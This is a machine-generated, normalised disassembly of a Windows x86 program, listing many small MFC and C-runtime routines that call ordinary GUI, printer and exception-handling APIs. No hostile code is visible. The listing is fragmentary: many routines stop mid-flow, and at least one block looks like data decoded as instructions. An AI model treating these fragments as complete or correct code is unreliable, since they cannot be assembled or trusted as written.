push 0x1
push [ esp + 0xc ]
call sub_411453
add esp 0xc
retn
sub_4114f8
push 0xd
call sub_4136da
pop ecx
retn
sub_411501
push 0xd
call sub_41373b
pop ecx
retn
sub_4119ee
mov eax [ esp + 0x4 ]
push 0x0
movzx eax [ eax ]
test [ eax + rw-data ] 0x4
pop eax
setne al
inc eax
retn
sub_411c5b
call sub_411c73
call sub_416a41
mov [ rw-data ] eax
call sub_4169f1
fnclex
retn
sub_411c72
retn
sub_411c73
mov eax sub_416e1a
mov [ rw-data ] sub_416ac4
mov [ rw-data ] eax
mov [ rw-data ] sub_416b2a
mov [ rw-data ] sub_416a6a
mov [ rw-data ] sub_416b12
mov [ rw-data ] eax
retn
sub_411dcc
push 0x9
call sub_41373b
pop ecx
retn
sub_411e61
push 0x9
call sub_41373b
pop ecx
retn
sub_411f08
push 0x9
call sub_41373b
pop ecx
retn
sub_411f83
push 0x9
call sub_41373b
pop ecx
retn
sub_412364
cmp [ rw-data ] 0x0
jne r-xdata
retn
push 0xfffffffd
call sub_411f8c
pop ecx
mov [ rw-data ] 0x1
sub_412406
push 0x0
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_412380
mov eax [ esp + 0x18 ]
add esp 0x10
retn
sub_412638
push 0x9
call sub_41373b
pop ecx
retn
sub_412786
push 0x9
call sub_41373b
pop ecx
xor edi edi
retn
sub_4129c1
push 0x1
push [ esp + 0x8 ]
call sub_4129cf
pop ecx
pop ecx
retn
sub_413079
push [ ebp - 0x14 ]
call sub_4130b0
pop ecx
retn
sub_4130b0
mov eax [ esp + 0x4 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
je r-xdata
jmp sub_4135fa
xor eax eax
retn
sub_4131e6
push [ ebp - 0x14 ]
call sub_41325c
pop ecx
retn
sub_41343e
push 0x1
pop eax
retn
sub_413442
mov esp [ ebp - 0x18 ]
jmp sub_4135fa
sub_4134a0
xor eax eax
cmp [ ebp + 0xc ] al
setne al
retn
sub_4134a9
mov esp [ ebp - 0x18 ]
jmp sub_4135fa
sub_413580
mov eax [ esp + 0x4 ]
mov [ eax + 0x50 ] rw-data
mov [ eax + 0x14 ] 0x1
retn
sub_413642
push 0x1
pop eax
retn
sub_413698
push 0x1
pop eax
retn
sub_4136b1
push esi
mov esi [ InitializeCriticalSection@IAT ]
push [ rw-data ]
call esi
push [ rw-data ]
call esi
push [ rw-data ]
call esi
push [ rw-data ]
call esi
pop esi
retn
sub_413899
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
mov eax [ ecx + 0x1c ]
push eax
mov eax [ ecx + 0x18 ]
push eax
call sub_410472
add esp 0x8
pop ebp
retn 0x4
sub_4144cc
push sub_414486
call [ SetUnhandledExceptionFilter@IAT ]
mov [ rw-data ] eax
retn
sub_4144dd
push [ rw-data ]
call [ SetUnhandledExceptionFilter@IAT ]
retn
sub_415a7a
push 0x1
pop eax
retn
sub_415b2e
push 0x1
pop eax
retn
sub_415d79
push 0x9
call sub_41373b
pop ecx
retn
sub_415e02
push 0x9
call sub_41373b
pop ecx
retn
sub_41683e
mov eax [ esp + 0x4 ]
add [ eax ] 0x4
mov eax [ eax ]
mov eax [ eax - 0x4 ]
retn
sub_41684b
mov eax [ esp + 0x4 ]
add [ eax ] 0x8
mov ecx [ eax ]
mov eax [ ecx - 0x8 ]
mov edx [ ecx - 0x4 ]
retn
sub_41685b
mov eax [ esp + 0x4 ]
add [ eax ] 0x4
mov eax [ eax ]
mov ax [ eax - 0x4 ]
retn
sub_4169a1
push 0x1
pop eax
retn
sub_4169f1
push 0x30000
push 0x10000
call sub_417dda
pop ecx
pop ecx
retn
sub_416b12
mov eax [ esp + 0x4 ]
fld [ eax ]
fcomp [ r--data ]
fnstsw ax
sahf
jb r-xdata
xor eax eax
retn
push 0x1
pop eax
retn
sub_41722a
push esi
push 0xb
call sub_4136da
push [ esp + 0xc ]
call sub_41724b
push 0xb
mov esi eax
call sub_41373b
add esp 0xc
mov eax esi
pop esi
retn
sub_417610
push esi
push 0x1
pop esi
push [ esp + 0xc ]
push [ esp + 0xc ]
call [ IsBadReadPtr@IAT ]
test eax eax
je r-xdata
mov eax esi
pop esi
retn
xor esi esi
sub_41762c
push esi
push 0x1
pop esi
push [ esp + 0xc ]
push [ esp + 0xc ]
call [ IsBadWritePtr@IAT ]
test eax eax
je r-xdata
mov eax esi
pop esi
retn
xor esi esi
sub_417648
push esi
push 0x1
pop esi
push [ esp + 0x8 ]
call [ IsBadCodePtr@IAT ]
test eax eax
je r-xdata
mov eax esi
pop esi
retn
xor esi esi
sub_417677
push 0x4
push 0x0
push [ esp + 0xc ]
call sub_417688
add esp 0xc
retn
sub_417c2b
call sub_418a4c
cmp [ rw-data ] 0x0
je r-xdata
retn
jmp sub_418941
sub_417dda
mov eax [ esp + 0x8 ]
and eax 0xfff7ffff
push eax
push [ esp + 0x8 ]
call sub_417da5
pop ecx
pop ecx
retn
sub_4183ab
push rw-data
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_41823f
add esp 0xc
retn
sub_4183c1
push rw-data
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_41823f
add esp 0xc
retn
sub_4185ba
push 0x2
call sub_41098a
pop ecx
retn
sub_41891f
mov eax [ esp + 0x4 ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
lea eax [ eax + eax * 8 ]
mov ecx [ ecx * 4 + rw-data ]
lea eax [ ecx + eax * 4 + 0xc ]
push eax
call [ LeaveCriticalSection@IAT ]
retn
sub_418a4c
push 0x1
call sub_418a55
pop ecx
retn
sub_419b14
push 0x1
pop eax
retn
sub_419b83
push 0x1
pop eax
retn
RtlUnwind
jmp [ RtlUnwind@IAT ]
GetFileTitleA
jmp [ GetFileTitleA@IAT ]
ClosePrinter
jmp [ ClosePrinter@IAT ]
OpenPrinterA
jmp [ OpenPrinterA@IAT ]
Ordinal_oledlg_8
jmp [ Ordinal_oledlg_8@IAT ]
sub_419f50
mov eax [ esp + 0x4 ]
test eax eax
jne r-xdata
xor ecx ecx
mov cx [ rw-data ]
push ecx
push eax
call [ GetPropA@IAT ]
retn
xor eax eax
retn
sub_41a650
mov eax [ esp + 0x4 ]
push 0x0
push eax
call sub_41a660
retn 0x4
sub_41a870
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ esp + 0x4 ]
push 0x0
push 0x0
push 0xffff
push eax
call sub_41bb50
add esp 0x10
retn 0x4
xor eax eax
retn 0x4
sub_41ac70
push esi
push rw-data
call [ EnterCriticalSection@IAT ]
push 0x0
call sub_41b2c0
add esp 0x4
mov esi eax
push rw-data
call [ LeaveCriticalSection@IAT ]
mov eax esi
pop esi
retn
sub_41b970
cmp [ rw-data ] 0x35f
jb r-xdata
mov eax [ esp + 0x8 ]
and eax 0xffffffdf
cmp ax 0x9
ja r-xdata
xor eax eax
retn
xor eax eax
retn
mov eax 0x1
retn
sub_41cd70
mov eax [ esp + 0x10 ]
push 0x2
mov ecx [ esp + 0x10 ]
push eax
mov edx [ esp + 0x10 ]
push ecx
mov eax [ esp + 0x10 ]
push edx
push eax
call sub_41cc20
add esp 0x14
retn 0x10
sub_41cfd0
mov eax [ esp + 0x10 ]
push 0x1
mov ecx [ esp + 0x10 ]
push eax
mov edx [ esp + 0x10 ]
push ecx
mov eax [ esp + 0x10 ]
push edx
push eax
call sub_41cda0
add esp 0x14
retn 0x10
sub_41d2c6
or [ ecx ] ecx
pop es
or [ ecx ] ecx
or [ eax ] ecx
or [ eax ] cl
int3
sub_41d687
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_424523
retn 0x10
sub_41d69f
call sub_4272f7
mov ecx [ esp + 0x4 ]
test ecx ecx
mov [ eax + 0x14 ] cl
jne r-xdata
push 0x1
pop eax
retn 0x8
push 0xfffffffd
call sub_411f8c
pop ecx
sub_41d6bd
push 0x1
push 0x0
call sub_4279c1
call sub_427d2c
jmp sub_4279db
j_sub_41d6d5
jmp sub_41d6d5
sub_41d6d5
push 0x600
push 0x0
call sub_41d69f
push sub_41d6bd
call sub_41064b
pop ecx
mov [ rw-data ] al
retn
sub_41d726
lea eax [ esp + 0x4 ]
push esi
push eax
mov esi ecx
push 0x1
call sub_422584
mov eax esi
pop esi
retn 0x4
sub_41dba7
mov ecx [ esp + 0x4 ]
lea eax [ esp + 0xc ]
push eax
push [ esp + 0xc ]
call sub_41d85a
retn
sub_41dc3f
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x4 ]
push r--data
push eax
mov [ ebp - 0x4 ] rw-data
call sub_410a97
sub_41dd3c
mov eax r--data
retn
sub_41dd42
push esi
mov esi ecx
push 0x1
call sub_421060
test eax eax
je r-xdata
pop esi
retn
mov ecx esi
call sub_41f34e
j_sub_41f34e
jmp sub_41f34e
sub_41dd5e
call sub_41f34e
retn 0x4
sub_41dd66
mov eax r--data
retn
sub_41de49
retn 0x4
sub_41df4a
mov eax ecx
and [ eax + 0x4 ] 0x0
mov [ eax ] r--data
retn
sub_41df57
push esi
mov esi ecx
call sub_41df73
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_4221e2
pop ecx
sub_41df73
mov eax sub_42abc4
call sub_410a78
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
and [ ebp - 0x4 ] 0x0
call sub_41dfc6
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_41dfc6
cmp [ ecx + 0x4 ] 0x0
jne r-xdata
call sub_41df9c
push eax
call [ ImageList_Destroy@IAT ]
retn
xor eax eax
retn
sub_41dfdc
push 0x0
call sub_41ded8
mov ecx eax
xor eax eax
test ecx ecx
je r-xdata
retn 0x4
push [ esp + 0x4 ]
add ecx 0x4
call sub_41e4f6
sub_41dffa
mov eax ecx
mov ecx [ esp + 0x4 ]
mov [ eax ] r--data
mov [ eax + 0x4 ] ecx
retn 0x4
sub_41e00c
push 0x1
pop eax
retn 0x4
sub_41e012
xor eax eax
retn 0x4
sub_41e08f
mov ecx [ ebp - 0x14 ]
call sub_423058
mov eax sub_41e09d
retn
sub_41e09d
mov eax 0x8000ffff
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x10
sub_41e0e8
mov ecx [ ebp - 0x14 ]
call sub_423058
mov eax sub_41e0f6
retn
sub_41e0f6
mov eax 0x8000ffff
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x10
sub_41e168
mov ecx [ ebp + 0x8 ]
call sub_423058
mov eax sub_41e176
retn
sub_41e176
mov eax 0x8000ffff
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x14
sub_41e18c
mov eax 0x80004001
retn 0x4
sub_41e194
mov eax 0x80004001
retn 0x18
sub_41e19c
mov eax 0x80004001
retn 0xc
sub_41e1a4
mov eax 0x80004001
retn 0x8
sub_41e1ac
mov eax ecx
xor ecx ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x14 ] ecx
mov ecx [ esp + 0x4 ]
mov [ eax ] r--data
mov [ eax + 0x18 ] ecx
retn 0x4
sub_41e1cf
push esi
mov esi ecx
call sub_41e20b
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_4221e2
pop ecx
sub_41e20b
mov eax sub_42b344
call sub_410a78
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
and [ ebp - 0x4 ] 0x0
call sub_41e1eb
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_41e28c
mov eax [ esp + 0x4 ]
mov edx [ ecx + 0x10 ]
mov [ eax ] edx
dec [ ecx + 0xc ]
mov [ ecx + 0x10 ] eax
jne r-xdata
retn 0x4
call sub_41e1eb
sub_41e34c
mov eax [ esp + 0x8 ]
imul eax [ esp + 0xc ]
add eax 0x4
push eax
call sub_4221b9
pop ecx
mov ecx [ esp + 0x4 ]
mov edx [ ecx ]
mov [ eax ] edx
mov [ ecx ] eax
retn 0xc
sub_41e36c
test ecx ecx
je r-xdata
retn
push esi
mov esi [ ecx ]
push ecx
call sub_4221e2
pop ecx
test esi esi
mov ecx esi
jne r-xdata
pop esi
sub_41e3a9
push esi
mov esi ecx
call sub_41e435
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_4221e2
pop ecx
sub_41e435
mov eax sub_42ae94
call sub_410a78
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
and [ ebp - 0x4 ] 0x0
call sub_41e40a
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_41e4ab
mov eax [ esp + 0x4 ]
mov edx [ ecx + 0x10 ]
mov [ eax ] edx
dec [ ecx + 0xc ]
mov [ ecx + 0x10 ] eax
jne r-xdata
retn 0x4
call sub_41e40a
sub_41e667
mov eax r--data
retn
sub_41e78b
push esi
mov esi ecx
call sub_41e7a7
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_4221e2
pop ecx
sub_41e96d
mov ecx [ ebp - 0x2c ]
call sub_423058
mov eax [ ebp - 0x24 ]
or [ eax + 0x2c ] 0xffffffff
mov eax r-xdata
retn
sub_41ea07
mov eax [ esp + 0x4 ]
push 0x1
mov [ ecx + 0x58 ] eax
pop eax
retn 0x4
sub_41ebc2
mov ecx [ ebp - 0x24 ]
call sub_423058
mov eax [ ebp - 0x1c ]
or [ eax + 0x2c ] 0xffffffff
mov eax r-xdata
retn
sub_41ec29
push esi
mov esi ecx
test [ esi + 0x24 ] 0x18
je r-xdata
push [ esp + 0x8 ]
push [ esi + 0x1c ]
call [ EndDialog@IAT ]
pop esi
retn 0x4
mov eax [ esi ]
push [ esp + 0x8 ]
call [ eax + 0x74 ]
sub_41ed4e
retn 0x4
sub_41edb6
push esi
mov esi ecx
push 0x1
call sub_421060
test eax eax
je r-xdata
pop esi
retn
push 0x1
mov ecx esi
call sub_41ec29
sub_41edcf
push 0x2
call sub_41ec29
retn
sub_41ee53
push [ esp + 0xc ]
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_420f80
retn 0xc
sub_41eea5
mov eax [ ecx + 0x3c ]
test eax eax
je r-xdata
xor eax eax
add eax 0x20000
jmp r-xdata
retn 0x8
j_sub_41eebd
jmp sub_41eebd
sub_41eebd
push r--data
call [ RegisterWindowMessageA@IAT ]
mov [ rw-data ] eax
retn
sub_41eece
call sub_41eed8
jmp sub_41eee5
sub_41eed8
push 0x0
mov ecx rw-data
call sub_41f004
retn
sub_41eee5
push sub_41eef1
call sub_41064b
pop ecx
retn
sub_41eef1
test [ rw-data ] 0x1
jne r-xdata
retn
or [ rw-data ] 0x1
mov ecx rw-data
jmp sub_41fa5a
sub_41ef0c
call sub_41ef16
jmp sub_41ef23
sub_41ef16
push 0x1
mov ecx rw-data
call sub_41f004
retn
sub_41ef23
push sub_41ef2f
call sub_41064b
pop ecx
retn
sub_41ef2f
test [ rw-data ] 0x2
jne r-xdata
retn
or [ rw-data ] 0x2
mov ecx rw-data
jmp sub_41fa5a
sub_41ef4a
call sub_41ef54
jmp sub_41ef61
sub_41ef54
push 0xffffffff
mov ecx rw-data
call sub_41f004
retn
sub_41ef61
push sub_41ef6d
call sub_41064b
pop ecx
retn
sub_41ef6d
test [ rw-data ] 0x4
jne r-xdata
retn
or [ rw-data ] 0x4
mov ecx rw-data
jmp sub_41fa5a
sub_41ef88
call sub_41ef92
jmp sub_41ef9f
sub_41ef92
push 0xfffffffe
mov ecx rw-data
call sub_41f004
retn
sub_41ef9f
push sub_41efab
call sub_41064b
pop ecx
retn
sub_41efab
test [ rw-data ] 0x8
jne r-xdata
retn
or [ rw-data ] 0x8
mov ecx rw-data
jmp sub_41fa5a
sub_41efe8
push esi
mov esi ecx
call sub_41fa5a
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_4221e2
pop ecx
sub_41f07f
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push 0xfffffff0
push [ esp + 0x14 ]
call sub_41f030
retn 0x10
sub_41f099
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push 0xffffffec
push [ esp + 0x14 ]
call sub_41f030
retn 0x10
sub_41f0b3
push esi
mov esi [ esp + 0x8 ]
push [ esp + 0xc ]
push [ esi + 0x1c ]
call [ GetWindowRect@IAT ]
mov ecx esi
call sub_421a57
mov ecx [ esp + 0x10 ]
pop esi
mov [ ecx ] eax
retn 0xc
sub_41f40e
push 0x0
call sub_41f375
mov ecx eax
xor eax eax
test ecx ecx
je r-xdata
retn 0x4
push [ esp + 0x4 ]
add ecx 0x4
call sub_41e4f6
sub_41f493
retn
sub_41f9ee
push esi
mov esi [ esp + 0x8 ]
cmp [ esi + 0x28 ] 0x0
jne r-xdata
push 0x1
pop eax
pop esi
retn 0x4
push 0x1
call sub_421665
mov [ esi + 0x28 ] r--data
sub_41fc06
cmp [ ecx + 0x1c ] 0x0
mov eax [ ecx ]
je r-xdata
jmp [ eax + 0xa4 ]
jmp [ eax + 0x58 ]
sub_41fcab
lea eax [ ecx + 0x28 ]
retn
sub_41fcaf
push esi
mov esi ecx
call sub_4272f7
mov eax [ eax + 0x1034 ]
test eax eax
je r-xdata
xor eax eax
pop esi
retn 0x4
push esi
push [ esp + 0xc ]
call eax
sub_41fdfd
mov eax [ esp + 0x8 ]
push esi
push 0x0
mov esi ecx
push [ eax + 0xc ]
call sub_420ac6
test eax eax
jne r-xdata
pop esi
retn 0x8
mov ecx esi
call sub_41f34e
sub_4200ec
mov eax r--data
retn
sub_4206e8
push esi
mov esi ecx
call sub_421fda
mov [ esi ] r--data
mov [ esi + 0x28 ] 0x1
mov eax esi
pop esi
retn
sub_420701
mov eax [ esp + 0x4 ]
mov [ ecx + 0x18 ] 0x1
mov [ ecx + 0x28 ] eax
retn 0x4
sub_420cda
cmp [ esp + 0x4 ] 0x0
jne r-xdata
xor eax eax
retn 0x8
call sub_4270c5
test [ eax + 0xdf ] 0x40
jne r-xdata
push 0x1
call sub_41fcce
sub_421058
mov eax 0xffff
retn 0x8
sub_4210be
mov eax r-xdata
retn
sub_4210c4
mov esi [ ebp - 0x1c ]
push 0xf108
push 0x30
mov ecx esi
mov eax [ esi ]
call [ eax + 0x10 ]
mov ecx esi
call sub_423058
mov eax r-xdata
retn
sub_421102
mov eax ecx
mov ecx [ esp + 0x8 ]
and [ eax + 0x8 ] 0x0
mov [ eax ] ecx
mov ecx [ esp + 0x4 ]
mov [ eax + 0x4 ] ecx
retn 0x8
sub_4212cd
push 0x1
pop eax
retn
sub_421582
mov eax [ ecx + 0x24 ]
and eax 0x10
retn
sub_42191c
mov eax [ ecx + 0x90 ]
test eax eax
je r-xdata
xor eax eax
retn
cmp eax 0xe002
je r-xdata
cmp eax 0xe001
je r-xdata
push 0x1
pop eax
retn
sub_4219a6
push [ esp + 0x4 ]
mov ecx rw-data
call sub_4096cf
retn
sub_4219b5
push [ esp + 0xc ]
mov ecx [ ecx + 0x34 ]
push [ esp + 0xc ]
mov eax [ ecx ]
push [ esp + 0xc ]
call [ eax + 0x54 ]
retn 0xc
sub_421a57
mov eax [ ecx + 0x38 ]
test eax eax
jne r-xdata
mov edx [ eax ]
mov ecx eax
jmp [ edx + 0x70 ]
push 0xfffffff0
push [ ecx + 0x1c ]
call [ GetWindowLongA@IAT ]
retn
sub_421a71
mov eax [ ecx + 0x38 ]
test eax eax
jne r-xdata
mov edx [ eax ]
mov ecx eax
jmp [ edx + 0x74 ]
push 0xffffffec
push [ ecx + 0x1c ]
call [ GetWindowLongA@IAT ]
retn
sub_421a8b
mov eax [ ecx + 0x38 ]
test eax eax
jne r-xdata
mov edx [ eax ]
push [ esp + 0x4 ]
mov ecx eax
call [ edx + 0x80 ]
push [ esp + 0x4 ]
push [ ecx + 0x1c ]
call [ SetWindowTextA@IAT ]
jmp r-xdata
retn 0x4
sub_421ae1
mov eax [ ecx + 0x38 ]
test eax eax
jne r-xdata
mov edx [ eax ]
mov ecx eax
jmp [ edx + 0x90 ]
push [ ecx + 0x1c ]
call [ GetDlgCtrlID@IAT ]
retn
sub_421bb3
mov eax [ ecx + 0x38 ]
test eax eax
jne r-xdata
mov edx [ eax ]
mov ecx eax
jmp [ edx + 0xa4 ]
push [ ecx + 0x1c ]
call [ IsWindowEnabled@IAT ]
retn
sub_421bce
mov eax [ ecx + 0x38 ]
test eax eax
jne r-xdata
mov edx [ eax ]
push [ esp + 0x4 ]
mov ecx eax
call [ edx + 0xa8 ]
push [ esp + 0x4 ]
push [ ecx + 0x1c ]
call [ EnableWindow@IAT ]
jmp r-xdata
retn 0x4
sub_421bf5
mov eax [ ecx + 0x38 ]
test eax eax
jne r-xdata
mov edx [ eax ]
mov ecx eax
jmp [ edx + 0xac ]
push [ ecx + 0x1c ]
call [ SetFocus@IAT ]
push eax
call sub_41f3e7
retn
sub_421c3d
cmp [ ecx + 0x38 ] 0x0
je r-xdata
retn 0xc
push 0x0
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push 0x2
push [ esp + 0x14 ]
push ecx
call sub_421c16
add esp 0x18
sub_421c9c
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
retn 0x4
mov eax [ esp + 0x4 ]
mov eax [ eax + 0x34 ]
test eax eax
je r-xdata
mov edx [ eax ]
push ecx
mov ecx eax
call [ edx + 0x8c ]
sub_421ce9
mov eax ecx
push 0x1
pop ecx
xor edx edx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] edx
mov [ eax + 0x10 ] edx
mov [ eax + 0x14 ] ecx
mov [ eax + 0x18 ] edx
retn
sub_421f44
push 0x1
pop eax
retn 0x4
sub_421f4a
xor eax eax
retn
sub_421f4d
mov eax 0x80029c4a
retn 0x8
sub_421f55
call sub_4272f7
mov eax [ eax + 0x4 ]
push 0x1
mov ecx eax
mov edx [ eax ]
call [ edx + 0x90 ]
retn
sub_421f6a
call sub_4272f7
mov eax [ eax + 0x4 ]
push 0xffffffff
mov ecx eax
mov edx [ eax ]
call [ edx + 0x90 ]
retn
sub_421f7f
mov eax r--data
retn
sub_421f85
mov eax r--data
retn
sub_421f8b
mov eax r--data
retn
sub_421f91
mov eax r--data
retn
sub_421fc9
mov eax r--data
retn
sub_421fcf
xor eax eax
retn 0x4
sub_421fd4
mov eax r--data
retn
sub_42219f
call sub_41dc26
xor eax eax
retn
sub_422220
call sub_42222a
jmp sub_422239
sub_42222a
push 0x40
push 0x50
mov ecx rw-data
call sub_4095dc
retn
sub_422239
push sub_422245
call sub_41064b
pop ecx
retn
sub_422245
mov ecx rw-data
jmp sub_409604
sub_42224f
call sub_422259
jmp sub_42226b
sub_422259
push 0x40
push 0x90
mov ecx rw-data
call sub_4095dc
retn
sub_42226b
push sub_422277
call sub_41064b
pop ecx
retn
sub_422277
mov ecx rw-data
jmp sub_409604
sub_422281
call sub_42228b
jmp sub_42229d
sub_42228b
push 0x40
push 0x110
mov ecx rw-data
call sub_4095dc
retn
sub_42229d
push sub_4222a9
call sub_41064b
pop ecx
retn
sub_4222a9
mov ecx rw-data
jmp sub_409604
sub_4222b3
call sub_4222bd
jmp sub_4222cf
sub_4222bd
push 0x40
push 0x210
mov ecx rw-data
call sub_4095dc
retn
sub_4222cf
push sub_4222db
call sub_41064b
pop ecx
retn
sub_4222db
mov ecx rw-data
jmp sub_409604
sub_4223e0
push esi
mov esi [ esp + 0x8 ]
cmp esi [ rw-data ]
je r-xdata
pop esi
retn 0x4
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jg r-xdata
mov ecx esi
call sub_422367
sub_422403
mov eax [ ecx ]
cmp [ eax - 0x8 ] 0x0
je r-xdata
retn
cmp [ eax - 0xc ] 0x0
jl r-xdata
push rw-data
call sub_422601
jmp sub_4223af
sub_42272d
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
mov eax [ eax ]
push eax
push [ eax - 0x8 ]
call sub_4226a7
mov eax esi
pop esi
retn 0x4
sub_422812
mov eax r--data
retn
sub_422a73
cmp [ ecx + 0x24 ] 0x0
je r-xdata
retn
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
sub_422b5d
mov eax [ ecx + 0x38 ]
retn
sub_422f56
mov eax [ ecx + 0x20 ]
test eax eax
jne r-xdata
retn
mov eax [ ecx + 0x1c ]
test eax eax
jne r-xdata
call [ GetActiveWindow@IAT ]
push eax
call sub_41f3e7
sub_422fc3
cmp [ esp + 0x8 ] 0x0
je r-xdata
xor eax eax
retn
push [ esp + 0x4 ]
mov ecx [ esp + 0xc ]
call sub_422fb1
test eax eax
je r-xdata
mov eax [ esp + 0x8 ]
retn
sub_42301b
mov ecx [ ebp - 0x18 ]
call sub_423058
mov eax r-xdata
retn
sub_423029
test ecx ecx
je r-xdata
xor eax eax
cmp ecx [ esp + 0x4 ]
je r-xdata
push 0x1
pop eax
jmp r-xdata
mov ecx [ ecx + 0x10 ]
jmp sub_423029
retn 0x4
sub_423042
mov eax ecx
mov [ eax + 0x4 ] 0x1
retn
sub_42304c
mov eax ecx
mov ecx [ esp + 0x4 ]
mov [ eax + 0x4 ] ecx
retn 0x4
sub_423058
cmp [ ecx + 0x4 ] 0x0
jle r-xdata
retn
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
sub_42314e
mov eax [ ecx ]
test eax eax
je r-xdata
retn
push eax
call [ GlobalFree@IAT ]
sub_42315c
mov eax [ ecx ]
and [ ecx ] 0x0
retn
sub_42348a
call sub_42731d
inc [ eax + 0x10 ]
retn
sub_423824
push 0x1
call sub_4237b2
mov ecx eax
push [ esp + 0x4 ]
call sub_4235f2
retn 0x4
sub_423839
push 0x0
call sub_4237b2
mov ecx eax
xor eax eax
test ecx ecx
je r-xdata
retn 0x4
push [ esp + 0x4 ]
add ecx 0x4
call sub_41e4f6
sub_423881
cmp [ ecx + 0x4 ] 0x0
jne r-xdata
call sub_423857
push eax
call [ DestroyMenu@IAT ]
retn
xor eax eax
retn
sub_423942
mov eax ecx
mov ecx [ rw-data ]
mov [ eax + 0xc ] ecx
or [ eax + 0x4 ] 0xffffffff
and [ eax + 0x8 ] 0x0
mov [ eax ] r--data
retn
sub_42395c
push esi
mov esi ecx
call sub_423997
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_4221e2
pop ecx
sub_423978
mov eax ecx
mov ecx [ rw-data ]
mov [ eax + 0xc ] ecx
mov ecx [ esp + 0x4 ]
and [ eax + 0x8 ] 0x0
mov [ eax ] r--data
mov [ eax + 0x4 ] ecx
retn 0x4
sub_423c4e
mov eax [ ecx + 0x4 ]
cmp eax 0xffffffff
je r-xdata
retn
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
push eax
call [ GetLastError@IAT ]
push eax
call sub_424179
sub_423cb0
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
je r-xdata
lea ecx [ esi + 0xc ]
call sub_422403
pop esi
retn
push eax
call [ CloseHandle@IAT ]
or [ esi + 0x4 ] 0xffffffff
sub_423d7b
xor eax eax
retn 0x10
sub_424179
cmp [ esp + 0x4 ] 0x0
je r-xdata
retn 0x8
push [ esp + 0x8 ]
push [ esp + 0x8 ]
push [ esp + 0xc ]
call sub_4242a5
push eax
call sub_42423a
sub_424599
mov eax [ ecx + 0x1c ]
push 0x0
push 0x0
push 0x10
push [ eax + 0x1c ]
call [ SendMessageA@IAT ]
retn
sub_4245ac
mov eax ecx
xor ecx ecx
mov [ eax ] r--data
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
retn
sub_4245c0
push esi
mov esi ecx
call sub_4246cb
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_4221e2
pop ecx
sub_42464e
push 0x1
call sub_4245dc
mov ecx eax
push [ esp + 0x4 ]
call sub_4235f2
retn 0x4
sub_424701
mov eax [ esp + 0x4 ]
mov [ ecx + 0x8 ] eax
retn 0x4
sub_42470b
mov eax [ esp + 0x4 ]
mov [ ecx + 0x4 ] eax
retn 0x4
sub_424715
and [ ecx + 0x8 ] 0x0
retn
sub_42471a
and [ ecx + 0x4 ] 0x0
retn
sub_424a7c
push [ esp + 0x4 ]
push [ ecx + 0x4 ]
call [ GetClipBox@IAT ]
retn 0x4
sub_424bb4
push esi
mov esi ecx
call sub_424bd0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_4221e2
pop ecx
sub_424c68
push esi
mov esi ecx
call sub_424c84
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_4221e2
pop ecx
sub_424d1c
push esi
mov esi ecx
call sub_424d38
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_4221e2
pop ecx
sub_424df1
push 0x1
call sub_424d7f
mov ecx eax
push [ esp + 0x4 ]
call sub_4235f2
retn 0x4
sub_424e5d
cmp [ ecx + 0x4 ] 0x0
jne r-xdata
call sub_424e33
push eax
call [ DeleteObject@IAT ]
retn
xor eax eax
